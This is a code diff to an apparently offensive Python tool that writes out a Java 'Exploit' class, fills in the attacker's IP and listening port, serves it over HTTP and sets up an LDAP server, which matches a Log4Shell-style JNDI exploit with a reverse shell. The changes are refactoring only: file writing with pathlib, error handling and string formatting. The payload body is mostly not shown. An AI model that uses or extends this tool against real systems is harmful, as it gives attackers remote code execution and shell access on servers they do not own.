@@ -2,6 +2,7 @@ import argparse
 from colorama import Fore, init
 import subprocess
 import threading
+from pathlib import Path
 
 from http.server import HTTPServer, SimpleHTTPRequestHandler
 
@@ -9,8 +10,7 @@ init(autoreset=True)
 
 def payload(userip , webport , lport):
 
-  genExploit = (
-      """
+  genExploit = """
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.OutputStream;
@@ -47,18 +47,17 @@ public class Exploit {
     s.close();
   }
 }
-  """) % (userip, lport)
+""" % (userip, lport)
 
   # writing the exploit to Exploit.java file 
 
   try:
-    f = open("Exploit.java", "w")
-    f.write(genExploit)
-    f.close()
-    print(Fore.GREEN + '[+] Exploit java class created success')
-
-  except Exception as e:
+    Path("Exploit.java").write_text(genExploit)
+  except OSError as e:
     print(Fore.RED + f'[-] Something went wrong {e}')
+    raise e
+  else:
+    print(Fore.GREEN + '[+] Exploit java class created success')
 
   checkJavaAvailible()
   print(Fore.GREEN + '[+] Setting up LDAP server\n')
